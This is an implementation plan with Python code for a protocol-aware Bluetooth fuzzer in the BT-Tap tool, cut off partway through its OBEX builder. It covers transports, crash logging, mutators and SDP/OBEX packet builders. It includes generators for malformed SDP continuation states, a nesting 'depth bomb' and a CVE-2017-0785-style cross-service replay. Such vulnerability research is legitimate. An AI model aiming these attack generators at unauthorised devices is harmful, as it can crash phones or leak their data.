# Protocol-Aware Bluetooth Fuzzer — Implementation Plan

> **Goal**: Build the first-of-its-kind protocol-aware Bluetooth fuzzer for 0-day vulnerability research in BT stack implementations (BlueZ, Android, iOS, embedded RTOS). Support multi-hour/multi-day fuzzing campaigns. Integrated into BT-Tap.
>
> **Reference**: `lessons-from-bluetooth-specifications.md` — byte-level protocol specs for all target protocols.

---

## Architecture Overview

### File Structure

```
bt_tap/
  fuzz/                              # NEW package (replaces single fuzz.py)
    __init__.py                      # Package init, FuzzEngine export
    engine.py                        # Campaign engine (orchestrator)
    crash_db.py                      # Crash database (SQLite)
    mutators.py                      # Mutation engine (bitflip, insert, delete, field-aware)
    corpus.py                        # Seed corpus management
    transport.py                     # Socket abstraction (L2CAP, RFCOMM, BLE)
    protocols/
      __init__.py
      l2cap.py                       # L2CAP signaling command builders
      sdp.py                         # SDP PDU + data element builders
      obex.py                        # OBEX packet + header builders
      at_commands.py                 # AT command corpus generator
      rfcomm.py                      # RFCOMM frame builders (raw L2CAP PSM 3)
      bnep.py                        # BNEP control message builders
      att.py                         # BLE ATT PDU builders
      smp.py                         # BLE SMP command builders
    strategies/
      __init__.py
      random_walk.py                 # Random protocol-aware mutations
      targeted.py                    # CVE-reproduction strategies
      coverage_guided.py             # Response-diversity guided fuzzing
      state_machine.py               # State-aware multi-step fuzzing
    legacy.py                        # Old L2CAPFuzzer/RFCOMMFuzzer/SDPFuzzer (compat)
```

### Design Principles

1. **Protocol builders** produce structured packets (dict of named fields → bytes)
2. **Mutators** operate on structured fields, not random bytes
3. **Campaign engine** manages target health, crash logging, session persistence, stats
4. **Everything returns structured dicts** for session/report integration
5. **Backward compatible**: old `bt-tap fuzz l2cap` commands still work
6. **No new required deps**: core fuzzing uses Python `socket` module. Bumble optional for L2CAP signaling.

---

## EPIC 1: Fuzzer Infrastructure (Foundation)

Everything the protocol fuzzers depend on.

---

### TASK 1.1: Transport Abstraction Layer

**File**: `bt_tap/fuzz/transport.py`

Unified transport wrapping L2CAP, RFCOMM, and BLE connections with timeout/reconnect/health-check.

#### 1.1.1: `BluetoothTransport` Base Class

```python
class BluetoothTransport:
    """Abstract base for Bluetooth socket transports."""

    def __init__(self, address: str, timeout: float = 5.0, max_reconnects: int = 3):
        self.address = address
        self.timeout = timeout
        self.max_reconnects = max_reconnects
        self.stats = TransportStats()
        self._sock: socket.socket | None = None

    def connect(self) -> bool: ...
    def send(self, data: bytes) -> int: ...
    def recv(self, bufsize: int = 4096) -> bytes | None: ...
    def close(self) -> None: ...
    def is_alive(self) -> bool: ...
    def reconnect(self) -> bool: ...
```

**Acceptance**: Can instantiate, connect, send/recv, close. Stats track bytes_sent, packets_sent.

#### 1.1.2: `L2CAPTransport`

```python
class L2CAPTransport(BluetoothTransport):
    def __init__(self, address: str, psm: int = 1, timeout: float = 5.0):
        super().__init__(address, timeout)
        self.psm = psm

    def connect(self) -> bool:
        self._sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        self._sock.settimeout(self.timeout)
        self._sock.connect((self.address, self.psm))
```

**Acceptance**: Connect to any L2CAP PSM (1=SDP, 3=RFCOMM, 15=BNEP, 23=AVCTP, 25=AVDTP).

#### 1.1.3: `RFCOMMTransport`

```python
class RFCOMMTransport(BluetoothTransport):
    def __init__(self, address: str, channel: int = 1, timeout: float = 5.0):
        super().__init__(address, timeout)
        self.channel = channel

    def connect(self) -> bool:
        self._sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM, BTPROTO_RFCOMM)
        self._sock.settimeout(self.timeout)
        self._sock.connect((self.address, self.channel))
```

**Acceptance**: Connect to any RFCOMM channel (1-30). Used for AT commands and OBEX.

#### 1.1.4: `BLETransport`

```python
class BLETransport(BluetoothTransport):
    """BLE L2CAP fixed-channel transport for ATT (CID 0x0004) or SMP (CID 0x0006)."""

    ATT_CID = 0x0004
    SMP_CID = 0x0006

    def __init__(self, address: str, cid: int = ATT_CID, timeout: float = 5.0):
        super().__init__(address, timeout)
        self.cid = cid

    def connect(self) -> bool:
        # Linux BLE L2CAP: use BTPROTO_L2CAP with BLE address type
        # May need: sock.setsockopt(SOL_BLUETOOTH, BT_SECURITY, struct.pack("BBH", level, 0, 0))
        self._sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        self._sock.settimeout(self.timeout)
        # For BLE, bind with CID: sock.bind(("", self.cid))
        # Connect with address type: (address, addr_type, cid)
        # Fallback: use bleak/Bumble if kernel doesn't support raw BLE L2CAP
```

**Acceptance**: Connect to BLE ATT or SMP channel. Document required socket options. Provide Bumble fallback path.

#### 1.1.5: Auto-Reconnect Logic

```python
def reconnect(self) -> bool:
    """Attempt reconnect with exponential backoff."""
    for attempt in range(self.max_reconnects):
        delay = min(2 ** attempt, 30)  # 1s, 2s, 4s, ... max 30s
        time.sleep(delay)
        try:
            self.close()
            if self.connect():
                self.stats.reconnects += 1
                return True
        except OSError:
            continue
    return False
```

**Acceptance**: On ConnectionResetError, attempt reconnect up to max_reconnects with backoff.

#### 1.1.6: Health Check

```python
def is_alive(self) -> bool:
    """Check target reachability via l2ping."""
    result = run_cmd(["l2ping", "-c", "1", "-t", "3", self.address], timeout=8)
    return result.returncode == 0
```

**Acceptance**: Returns True if target responds to l2ping within 3 seconds.

#### 1.1.7: Statistics Tracking

```python
@dataclass
class TransportStats:
    bytes_sent: int = 0
    bytes_received: int = 0
    packets_sent: int = 0
    packets_received: int = 0
    errors: int = 0
    reconnects: int = 0
    connection_drops: int = 0
    start_time: float = field(default_factory=time.time)

    @property
    def packets_per_second(self) -> float:
        elapsed = time.time() - self.start_time
        return self.packets_sent / max(elapsed, 0.001)
```

**Acceptance**: Stats updated on every send/recv/error/reconnect.

---

### TASK 1.2: Crash Database

**File**: `bt_tap/fuzz/crash_db.py`

SQLite database storing every crash/anomaly with the exact payload.

#### 1.2.1: Database Schema

```sql
CREATE TABLE IF NOT EXISTS crashes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL DEFAULT (datetime('now')),
    target_addr TEXT NOT NULL,
    protocol TEXT NOT NULL,
    payload_hex TEXT NOT NULL,
    payload_len INTEGER NOT NULL,
    payload_description TEXT,
    crash_type TEXT NOT NULL CHECK(crash_type IN (
        'connection_drop', 'timeout', 'unexpected_response',
        'device_disappeared', 'error_response', 'hang'
    )),
    response_hex TEXT,
    response_description TEXT,
    session_id TEXT,
    mutation_log TEXT,
    reproduced INTEGER DEFAULT 0,
    severity TEXT CHECK(severity IN ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO')),
    notes TEXT,
    payload_hash TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_crashes_hash ON crashes(payload_hash);
CREATE INDEX IF NOT EXISTS idx_crashes_protocol ON crashes(protocol);
CREATE INDEX IF NOT EXISTS idx_crashes_severity ON crashes(severity);
```

**Acceptance**: SQLite DB created in `sessions/<name>/fuzz/crashes.db`.

#### 1.2.2: `CrashDB` Class

```python
class CrashDB:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self._conn = sqlite3.connect(db_path)
        self._create_tables()

    def log_crash(self, target: str, protocol: str, payload: bytes,
                  crash_type: str, response: bytes | None = None,
                  mutation_log: str = "", session_id: str = "") -> int:
        """Log a crash. Returns crash ID. Deduplicates by payload hash."""

    def get_crashes(self, protocol: str | None = None,
                    severity: str | None = None) -> list[dict]: ...

    def get_unique_crashes(self) -> list[dict]:
        """Deduplicated by payload_hash."""

    def get_crash_by_id(self, crash_id: int) -> dict | None: ...

    def mark_reproduced(self, crash_id: int, reproduced: bool = True): ...

    def export_json(self, output_path: str): ...

    def crash_count(self) -> int: ...

    def close(self): ...
```

**Acceptance**: Log crashes, deduplicate, query, export.

#### 1.2.3: Deduplication

```python
def _payload_hash(self, payload: bytes) -> str:
    return hashlib.sha256(payload).hexdigest()
```

Skip insert if `payload_hash` already exists for same `(target_addr, protocol)`.

#### 1.2.4: Reproduction Helper

```python
def reproduce_crash(self, crash_id: int, transport: BluetoothTransport) -> bool:
    """Replay exact payload from crash DB. Returns True if crash recurs."""
    crash = self.get_crash_by_id(crash_id)
    payload = bytes.fromhex(crash["payload_hex"])
    try:
        transport.connect()
        transport.send(payload)
        response = transport.recv(timeout=5)
        if response is None:  # timeout = possible crash
            return True
    except (ConnectionResetError, BrokenPipeError):
        return True  # connection drop = crash confirmed
    return False
```

#### 1.2.5: Session Integration

Crash DB path: `sessions/<session_name>/fuzz/crashes.db`
Corpus path: `sessions/<session_name>/fuzz/corpus/`
Stats path: `sessions/<session_name>/fuzz/campaign_stats.json`

---

### TASK 1.3: Mutation Engine

**File**: `bt_tap/fuzz/mutators.py`

#### 1.3.1: `FieldMutator` — Raw Byte Mutations

```python
class FieldMutator:
    @staticmethod
    def bitflip(data: bytes, num_bits: int = 1) -> bytes:
        """Flip num_bits random bits in data."""
        arr = bytearray(data)
        for _ in range(num_bits):
            byte_idx = random.randint(0, len(arr) - 1)
            bit_idx = random.randint(0, 7)
            arr[byte_idx] ^= (1 << bit_idx)
        return bytes(arr)

    @staticmethod
    def byte_insert(data: bytes, pos: int | None = None, value: int | None = None) -> bytes:
        """Insert a byte at position."""
        if pos is None: pos = random.randint(0, len(data))
        if value is None: value = random.randint(0, 255)
        return data[:pos] + bytes([value]) + data[pos:]

    @staticmethod
    def byte_delete(data: bytes, pos: int | None = None) -> bytes:
        """Delete a byte at position."""
        if not data: return data
        if pos is None: pos = random.randint(0, len(data) - 1)
        return data[:pos] + data[pos+1:]

    @staticmethod
    def byte_replace(data: bytes, pos: int | None = None, value: int | None = None) -> bytes:
        if not data: return data
        if pos is None: pos = random.randint(0, len(data) - 1)
        if value is None: value = random.randint(0, 255)
        return data[:pos] + bytes([value]) + data[pos+1:]

    @staticmethod
    def chunk_duplicate(data: bytes, start: int | None = None, length: int | None = None) -> bytes:
        if not data: return data
        if start is None: start = random.randint(0, max(0, len(data) - 1))
        if length is None: length = random.randint(1, min(32, len(data) - start))
        chunk = data[start:start+length]
        return data[:start+length] + chunk + data[start+length:]

    @staticmethod
    def truncate(data: bytes, new_len: int | None = None) -> bytes:
        if new_len is None: new_len = random.randint(0, len(data))
        return data[:new_len]
```

#### 1.3.2: `IntegerMutator` — Integer Field Mutations

```python
class IntegerMutator:
    @staticmethod
    def boundary_values(bit_width: int) -> list[int]:
        """Generate boundary values for an integer field."""
        max_val = (1 << bit_width) - 1
        return [0, 1, 2, max_val - 1, max_val, max_val + 1,
                max_val // 2, max_val // 2 + 1, -1 & max_val]

    @staticmethod
    def mutate(value: int, bit_width: int) -> int:
        """Mutate an integer value."""
        strategy = random.choice(["boundary", "random", "bitflip", "increment"])
        max_val = (1 << bit_width) - 1
        if strategy == "boundary":
            return random.choice(IntegerMutator.boundary_values(bit_width))
        elif strategy == "random":
            return random.randint(0, max_val)
        elif strategy == "bitflip":
            bit = random.randint(0, bit_width - 1)
            return (value ^ (1 << bit)) & max_val
        elif strategy == "increment":
            delta = random.choice([-1, 1, -2, 2])
            return (value + delta) & max_val
        return value
```

#### 1.3.3: `LengthMutator` — Length Field Specific

```python
class LengthMutator:
    @staticmethod
    def mutate(actual_length: int, bit_width: int = 16) -> int:
        """Mutate a length field with high-value strategies."""
        max_val = (1 << bit_width) - 1
        strategies = [
            0,                          # Zero length
            1,                          # Minimal
            actual_length - 1,          # One short
            actual_length + 1,          # One over
            actual_length * 2,          # Double
            max_val,                    # Maximum
            random.randint(0, max_val), # Random
        ]
        return random.choice(strategies) & max_val
```

#### 1.3.4: `ProtocolMutator` — Structured Packet Mutation

```python
@dataclass
class PacketField:
    name: str
    value: int | bytes
    bit_width: int = 0       # For integer fields
    field_type: str = "raw"  # "uint", "length", "raw", "enum"

class ProtocolMutator:
    def mutate_packet(self, fields: list[PacketField],
                      num_mutations: int = 1) -> tuple[list[PacketField], list[str]]:
        """Mutate num_mutations random fields. Returns (mutated_fields, mutation_log)."""
        mutated = [PacketField(f.name, f.value, f.bit_width, f.field_type) for f in fields]
        log = []
        for _ in range(num_mutations):
            idx = random.randint(0, len(mutated) - 1)
            field = mutated[idx]
            original = field.value
            if field.field_type == "uint":
                field.value = IntegerMutator.mutate(field.value, field.bit_width)
            elif field.field_type == "length":
                field.value = LengthMutator.mutate(field.value, field.bit_width)
            elif field.field_type == "raw":
                field.value = FieldMutator.bitflip(field.value) if isinstance(field.value, bytes) else field.value
            log.append(f"{field.name}: {original!r} -> {field.value!r}")
        return mutated, log
```

#### 1.3.5: `CorpusMutator` — Traditional Byte-Level

```python
class CorpusMutator:
    @staticmethod
    def mutate(data: bytes, num_mutations: int = 1) -> bytes:
        """Apply random mutations to raw bytes."""
        result = data
        for _ in range(num_mutations):
            strategy = random.choice([
                FieldMutator.bitflip,
                FieldMutator.byte_insert,
                FieldMutator.byte_delete,
                FieldMutator.byte_replace,
                FieldMutator.chunk_duplicate,
                FieldMutator.truncate,
            ])
            result = strategy(result)
        return result
```

#### 1.3.6: Mutation Logging

Every mutation records `(field_name, original_value, mutated_value, strategy_name)` as a string for crash reproduction.

---

### TASK 1.4: Seed Corpus Management

**File**: `bt_tap/fuzz/corpus.py`

#### 1.4.1: `Corpus` Class

```python
class Corpus:
    def __init__(self, base_dir: str):
        self.base_dir = base_dir
        self.seeds: dict[str, list[bytes]] = {}  # protocol -> [seed_bytes]

    def load_from_directory(self, path: str) -> int: ...
    def add_seed(self, protocol: str, data: bytes, name: str = "") -> None: ...
    def get_random_seed(self, protocol: str) -> bytes: ...
    def save_interesting(self, protocol: str, data: bytes, reason: str) -> None: ...
    def seed_count(self, protocol: str | None = None) -> int: ...
    def generate_builtin_seeds(self, protocol: str) -> list[bytes]: ...
```

#### 1.4.2: Built-In Seed Generator

For each protocol, call the protocol builder to generate 10-50 valid baseline packets:
- SDP: ServiceSearchRequest for each standard UUID, ServiceAttributeRequest, ServiceSearchAttributeRequest
- OBEX: Connect(PBAP), Connect(MAP), Connect(OPP), SetPath(telecom), Get(pb.vcf), Put(test.vcf)
- AT: AT+BRSF=127, AT+CIND=?, AT+CIND?, AT+CMER=3,0,0,1, AT+CPBR=1,10, AT+CMGL="ALL"
- ATT: Exchange MTU, Find Info, Read By Group Type (primary services), Read, Write
- SMP: Pairing Request (Just Works), Pairing Request (SC)

#### 1.4.3: pcap/btsnoop Import

```python
def import_btsnoop(self, path: str) -> int:
    """Parse btsnoop capture, extract protocol payloads as seeds."""
    # btsnoop header: 8 bytes magic + 4 bytes version + 4 bytes datalink
    # Each record: orig_len(4) + incl_len(4) + flags(4) + drops(4) + ts(8) + data
    # Extract HCI ACL data -> L2CAP payload -> protocol-specific payload
```

#### 1.4.4: Corpus Minimization

Deduplicate seeds by response hash (same response = same code path = redundant seed).

---

### TASK 1.5: Campaign Engine

**File**: `bt_tap/fuzz/engine.py`

#### 1.5.1: `FuzzCampaign` Class

```python
class FuzzCampaign:
    def __init__(
        self,
        target: str,
        protocols: list[str],
        strategy: str = "random",
        duration: float | None = None,     # seconds, None = infinite
        max_iterations: int | None = None,
        session_dir: str = "",
    ):
        self.target = target
        self.protocols = protocols
        self.strategy = strategy
        self.duration = duration
        self.max_iterations = max_iterations
        self.crash_db = CrashDB(os.path.join(session_dir, "fuzz", "crashes.db"))
        self.corpus = Corpus(os.path.join(session_dir, "fuzz", "corpus"))
        self.stats = CampaignStats()
        self._running = False
```

#### 1.5.2: Main Loop

```python
def run(self):
    self._running = True
    signal.signal(signal.SIGINT, self._handle_interrupt)
    self._setup_transports()
    self._generate_seeds()

    while self._should_continue():
        protocol = self._next_protocol()
        transport = self._get_transport(protocol)

        # Generate fuzz case
        seed = self.corpus.get_random_seed(protocol)
        fuzz_case, mutation_log = self._mutate(protocol, seed)

        # Send and observe
        try:
            if not transport.is_connected():
                transport.connect()
            transport.send(fuzz_case)
            self.stats.packets_sent += 1

            response = transport.recv()
            self._analyze_response(protocol, fuzz_case, response, mutation_log)

        except ConnectionResetError:
            self._handle_crash("connection_drop", protocol, fuzz_case, mutation_log)
        except socket.timeout:
            self._handle_crash("timeout", protocol, fuzz_case, mutation_log)
        except BrokenPipeError:
            self._handle_crash("connection_drop", protocol, fuzz_case, mutation_log)

        self.stats.iterations += 1

        if self.stats.iterations % 1000 == 0:
            self._print_stats()

    self._finalize()
```

#### 1.5.3: Campaign Persistence

```python
def save_state(self):
    """Save campaign state for resume."""
    state = {
        "target": self.target,
        "protocols": self.protocols,
        "strategy": self.strategy,
        "stats": asdict(self.stats),
        "timestamp": datetime.now().isoformat(),
    }
    with open(os.path.join(self.session_dir, "fuzz", "campaign_state.json"), "w") as f:
        json.dump(state, f, indent=2)

@classmethod
def resume(cls, session_dir: str) -> "FuzzCampaign":
    """Resume campaign from saved state."""
    state = json.load(open(os.path.join(session_dir, "fuzz", "campaign_state.json")))
    campaign = cls(state["target"], state["protocols"], state["strategy"], session_dir=session_dir)
    campaign.stats = CampaignStats(**state["stats"])
    return campaign
```

#### 1.5.4: Statistics Dashboard (Rich Live)

```python
def _print_stats(self):
    table = Table(title="Fuzz Campaign Status")
    table.add_column("Metric", style="bold")
    table.add_column("Value")
    table.add_row("Runtime", format_duration(time.time() - self.stats.start_time))
    table.add_row("Packets Sent", f"{self.stats.packets_sent:,}")
    table.add_row("Packets/sec", f"{self.stats.packets_per_second:.1f}")
    table.add_row("Unique Crashes", str(self.crash_db.crash_count()))
    table.add_row("Reconnects", str(self.stats.reconnects))
    table.add_row("Current Protocol", self.stats.current_protocol)
    console.print(table)
```

#### 1.5.5: Duration/Iteration Limits

```python
def _should_continue(self) -> bool:
    if not self._running:
        return False
    if self.duration and (time.time() - self.stats.start_time) >= self.duration:
        return False
    if self.max_iterations and self.stats.iterations >= self.max_iterations:
        return False
    return True
```

Parsing: `--duration 24h` → 86400, `--duration 30m` → 1800, `--duration 7d` → 604800.

#### 1.5.6: Multi-Protocol Round-Robin

```python
def _next_protocol(self) -> str:
    """Round-robin across configured protocols."""
    idx = self.stats.iterations % len(self.protocols)
    return self.protocols[idx]
```

#### 1.5.7: Cooldown Logic

```python
def _handle_crash(self, crash_type, protocol, payload, mutation_log):
    self.crash_db.log_crash(self.target, protocol, payload, crash_type,
                            mutation_log="\n".join(mutation_log))
    self.stats.crashes += 1

    # Cooldown: wait for target recovery
    cooldown = 10  # seconds
    info(f"Crash detected ({crash_type}). Cooling down {cooldown}s...")
    time.sleep(cooldown)

    # Verify target is alive
    if not _check_target_alive(self.target):
        warning("Target not responding after cooldown. Extending wait...")
        time.sleep(30)
        if not _check_target_alive(self.target):
            error("Target appears permanently down. Stopping campaign.")
            self._running = False
```

#### 1.5.8: Session Integration

All campaign artifacts saved under `sessions/<name>/fuzz/`:
- `crashes.db` — SQLite crash database
- `corpus/` — seed and interesting inputs
- `campaign_state.json` — resumable state
- `campaign_stats.json` — final statistics

#### 1.5.9: Signal Handling

```python
def _handle_interrupt(self, signum, frame):
    info("Interrupt received. Saving state and stopping...")
    self._running = False
    self.save_state()
    self._print_stats()
```

---

### TASK 1.6: Backward Compatibility Bridge

#### 1.6.1: Move Existing Classes

Move `L2CAPFuzzer`, `RFCOMMFuzzer`, `SDPFuzzer`, `bss_wrapper`, `_check_target_alive` to `bt_tap/fuzz/legacy.py`.

#### 1.6.2: Re-export in `bt_tap/attack/fuzz.py`

```python
# bt_tap/attack/fuzz.py — backward compat shim
from bt_tap.fuzz.legacy import (
    L2CAPFuzzer, RFCOMMFuzzer, SDPFuzzer,
    bss_wrapper, _check_target_alive,
)
```

#### 1.6.3: Deprecation Notice

Add `warnings.warn("Use 'bt-tap fuzz campaign' for protocol-aware fuzzing", DeprecationWarning)` in legacy classes.

---

## EPIC 2: Protocol Builders (Packet Construction Libraries)

---

### TASK 2.1: SDP Protocol Builder

**File**: `bt_tap/fuzz/protocols/sdp.py`

#### 2.1.1: Data Element Encoder

```python
# DTD byte table (Type << 3 | SizeIndex)
DTD_NIL     = 0x00
DTD_UINT8   = 0x08; DTD_UINT16  = 0x09; DTD_UINT32  = 0x0A; DTD_UINT64  = 0x0B; DTD_UINT128 = 0x0C
DTD_SINT8   = 0x10; DTD_SINT16  = 0x11; DTD_SINT32  = 0x12
DTD_UUID16  = 0x19; DTD_UUID32  = 0x1A; DTD_UUID128 = 0x1C
DTD_STR8    = 0x25; DTD_STR16   = 0x26; DTD_STR32   = 0x27
DTD_BOOL    = 0x28
DTD_DES8    = 0x35; DTD_DES16   = 0x36; DTD_DES32   = 0x37
DTD_DEA8    = 0x3D; DTD_DEA16   = 0x3E
DTD_URL8    = 0x45; DTD_URL16   = 0x46

def encode_uint8(value: int) -> bytes: return bytes([DTD_UINT8, value & 0xFF])
def encode_uint16(value: int) -> bytes: return bytes([DTD_UINT16]) + struct.pack(">H", value)
def encode_uint32(value: int) -> bytes: return bytes([DTD_UINT32]) + struct.pack(">I", value)
def encode_uuid16(value: int) -> bytes: return bytes([DTD_UUID16]) + struct.pack(">H", value)
def encode_uuid128(value: bytes) -> bytes: return bytes([DTD_UUID128]) + value  # 16 bytes
def encode_string(value: str) -> bytes:
    raw = value.encode("utf-8")
    if len(raw) <= 255:
        return bytes([DTD_STR8, len(raw)]) + raw
    else:
        return bytes([DTD_STR16]) + struct.pack(">H", len(raw)) + raw
def encode_bool(value: bool) -> bytes: return bytes([DTD_BOOL, 1 if value else 0])
def encode_des(elements: list[bytes]) -> bytes:
    body = b"".join(elements)
    if len(body) <= 255:
        return bytes([DTD_DES8, len(body)]) + body
    else:
        return bytes([DTD_DES16]) + struct.pack(">H", len(body)) + body
```

#### 2.1.2: PDU Header Builder

```python
SDP_ERROR_RSP                     = 0x01
SDP_SERVICE_SEARCH_REQ            = 0x02
SDP_SERVICE_SEARCH_RSP            = 0x03
SDP_SERVICE_ATTR_REQ              = 0x04
SDP_SERVICE_ATTR_RSP              = 0x05
SDP_SERVICE_SEARCH_ATTR_REQ       = 0x06
SDP_SERVICE_SEARCH_ATTR_RSP       = 0x07

def build_sdp_pdu(pdu_id: int, transaction_id: int, params: bytes) -> bytes:
    return struct.pack(">BHH", pdu_id, transaction_id, len(params)) + params
```

#### 2.1.3-2.1.5: Request Builders

```python
def build_service_search_req(uuids: list[int], max_count: int = 0xFFFF,
                             continuation: bytes = b"\x00", tid: int = 1) -> bytes:
    pattern = encode_des([encode_uuid16(u) for u in uuids])
    params = pattern + struct.pack(">H", max_count) + continuation
    return build_sdp_pdu(SDP_SERVICE_SEARCH_REQ, tid, params)

def build_service_attr_req(handle: int, max_bytes: int = 0xFFFF,
                           attr_ranges: list[tuple[int,int]] | None = None,
                           continuation: bytes = b"\x00", tid: int = 1) -> bytes:
    if attr_ranges is None:
        attr_ranges = [(0x0000, 0xFFFF)]
    attrs = encode_des([encode_uint32((lo << 16) | hi) for lo, hi in attr_ranges])
    params = struct.pack(">I", handle) + struct.pack(">H", max_bytes) + attrs + continuation
    return build_sdp_pdu(SDP_SERVICE_ATTR_REQ, tid, params)

def build_service_search_attr_req(uuids: list[int], max_bytes: int = 0xFFFF,
                                  attr_ranges: list[tuple[int,int]] | None = None,
                                  continuation: bytes = b"\x00", tid: int = 1) -> bytes:
    if attr_ranges is None:
        attr_ranges = [(0x0000, 0xFFFF)]
    pattern = encode_des([encode_uuid16(u) for u in uuids])
    attrs = encode_des([encode_uint32((lo << 16) | hi) for lo, hi in attr_ranges])
    params = pattern + struct.pack(">H", max_bytes) + attrs + continuation
    return build_sdp_pdu(SDP_SERVICE_SEARCH_ATTR_REQ, tid, params)
```

#### 2.1.6: Continuation State Builder

```python
def build_continuation(info_bytes: bytes = b"") -> bytes:
    return bytes([len(info_bytes)]) + info_bytes

def build_continuation_oversized(size: int = 17) -> bytes:
    """InfoLength > 16 (spec max). Tests bounds checking."""
    return bytes([size]) + b"\xFF" * size
```

#### 2.1.7: Data Element Fuzzer

```python
def fuzz_invalid_dtd_bytes() -> list[bytes]:
    """Generate all 256 possible DTD header bytes — many are invalid."""
    cases = []
    for dtd in range(256):
        type_desc = (dtd >> 3) & 0x1F
        size_idx = dtd & 0x07
        # Types 9-31 are reserved
        if type_desc >= 9:
            cases.append(bytes([dtd, 0x01]))  # 1 byte of dummy data
        # Invalid combos: UUID with size_idx 0 or 3
        elif type_desc == 3 and size_idx in (0, 3):
            cases.append(bytes([dtd]) + b"\xFF" * 8)
        # Bool with non-zero size_idx
        elif type_desc == 5 and size_idx != 0:
            cases.append(bytes([dtd]) + b"\xFF" * 4)
    return cases

def fuzz_nested_des(depth: int = 100) -> bytes:
    """DES depth bomb — 100+ levels of nesting."""
    result = encode_uint8(0x42)  # innermost value
    for _ in range(depth):
        result = bytes([DTD_DES8, len(result)]) + result
    return result

def fuzz_des_size_overflow() -> bytes:
    """DES claiming 255 bytes but only containing 4."""
    return bytes([DTD_DES8, 0xFF]) + b"\x08\x01\x08\x02"
```

#### 2.1.8: UUID Constants

```python
UUID_SDP       = 0x0001; UUID_L2CAP     = 0x0100; UUID_RFCOMM    = 0x0003
UUID_OBEX      = 0x0008; UUID_BNEP      = 0x000F; UUID_AVCTP     = 0x0017
UUID_AVDTP     = 0x0019; UUID_ATT       = 0x0007
UUID_SPP       = 0x1101; UUID_HFP       = 0x111E; UUID_HFP_AG    = 0x111F
UUID_A2DP_SRC  = 0x110A; UUID_A2DP_SINK = 0x110B; UUID_AVRCP     = 0x110E
UUID_PBAP_PCE  = 0x112E; UUID_PBAP_PSE  = 0x112F; UUID_PBAP      = 0x1130
UUID_MAP_MSE   = 0x1132; UUID_MAP_MCE   = 0x1133; UUID_MAP       = 0x1134
UUID_HID       = 0x1124; UUID_PANU      = 0x1115; UUID_NAP       = 0x1116
```

#### 2.1.9: Continuation State Attack Generator

```python
def generate_continuation_attacks(initial_cont_state: bytes) -> list[bytes]:
    """Generate continuation state attack variants."""
    cont_len = len(initial_cont_state)
    attacks = [
        build_continuation(initial_cont_state),                    # Baseline
        build_continuation(b"\x00" * cont_len),                    # Zero offset
        build_continuation(b"\xFF" * cont_len),                    # Max offset
        build_continuation_oversized(17),                          # Exceed max InfoLength
        build_continuation_oversized(255),                         # Way oversized
    ]
    # Incremental sweep: probe every offset 0x00-0xFF
    for i in range(256):
        if cont_len == 1:
            attacks.append(build_continuation(bytes([i])))
        elif cont_len == 2:
            attacks.append(build_continuation(struct.pack(">H", i * 256)))
    return attacks

def generate_cross_service_attack(target_addr: str) -> list[tuple[bytes, bytes]]:
    """CVE-2017-0785 pattern: get cont_state from UUID A, replay in UUID B request."""
    # Returns list of (request_for_uuid_A, request_for_uuid_B_with_A_cont_state)
    uuid_pairs = [
        (UUID_L2CAP, UUID_SDP),
        (UUID_L2CAP, UUID_RFCOMM),
        (UUID_PBAP, UUID_L2CAP),
        (UUID_HFP, UUID_PBAP),
    ]
    # Actual attack requires sending A, capturing cont_state, then sending B with it
    # This function returns the request templates; the campaign engine handles sequencing
    return [(
        build_service_search_req([uuid_a], max_count=1, tid=1),
        lambda cont: build_service_search_req([uuid_b], max_count=256, continuation=cont, tid=2)
    ) for uuid_a, uuid_b in uuid_pairs]
```

---

### TASK 2.2: OBEX Protocol Builder

**File**: `bt_tap/fuzz/protocols/obex.py`

#### 2.2.1-2.2.11: Complete OBEX Builder

```python
import struct

# === Opcodes ===
OBEX_CONNECT    = 0x80; OBEX_DISCONNECT = 0x81
OBEX_PUT        = 0x02; OBEX_PUT_FINAL  = 0x82
OBEX_GET        = 0x03; OBEX_GET_FINAL  = 0x83
OBEX_SETPATH    = 0x85; OBEX_ABORT      = 0xFF

# === Response Codes ===
OBEX_CONTINUE       = 0x90; OBEX_SUCCESS        = 0xA0
OBEX_BAD_REQUEST    = 0xC0; OBEX_UNAUTHORIZED   = 0xC1
OBEX_FORBIDDEN      = 0xC3; OBEX_NOT_FOUND      = 0xC4
OBEX_INTERNAL_ERROR = 0xD0

# === Header IDs ===
HI_COUNT          = 0xC0; HI_NAME           = 0x01; HI_TYPE       = 0x42
HI_LENGTH         = 0xC3; HI_TIME           = 0x44; HI_DESCRIPTION= 0x05
HI_TARGET         = 0x46; HI_HTTP           = 0x47; HI_BODY       = 0x48
HI_END_OF_BODY    = 0x49; HI_WHO            = 0x4A; HI_CONNECTION_ID = 0xCB
HI_APP_PARAMS     = 0x4C

# === Profile UUIDs ===
PBAP_TARGET_UUID = bytes([0x79,0x61,0x35,0xF0,0xF0,0xC5,0x11,0xD8,
                          0x09,0x66,0x08,0x00,0x20,0x0C,0x9A,0x66])
MAP_MAS_TARGET_UUID = bytes([0xBB,0x58,0x2B,0x40,0x42,0x0C,0x11,0xDB,
                             0xB0,0xDE,0x08,0x00,0x20,0x0C,0x9A,0x66])

# === PBAP AppParam Tags ===
PBAP_TAG_ORDER             = 0x01; PBAP_TAG_SEARCH_VALUE      = 0x02
PBAP_TAG_SEARCH_ATTRIBUTE  = 0x03; PBAP_TAG_MAX_LIST_COUNT    = 0x04
PBAP_TAG_LIST_START_OFFSET = 0x05; PBAP_TAG_FILTER            = 0x06
PBAP_TAG_FORMAT            = 0x07

# === MAP AppParam Tags ===
MAP_TAG_MAX_LIST_COUNT     = 0x01; MAP_TAG_START_OFFSET       = 0x02
MAP_TAG_FILTER_MSG_TYPE    = 0x03; MAP_TAG_CHARSET            = 0x14
MAP_TAG_SUBJECT_LENGTH     = 0x13

# === Type Strings ===
PBAP_TYPE_PHONEBOOK  = b"x-bt/phonebook"
PBAP_TYPE_VCARD_LIST = b"x-bt/vcard-listing"
MAP_TYPE_MSG_LISTING = b"x-bt/MAP-msg-listing"
MAP_TYPE_MESSAGE     = b"x-bt/message"


def build_unicode_header(hi: int, text: str) -> bytes:
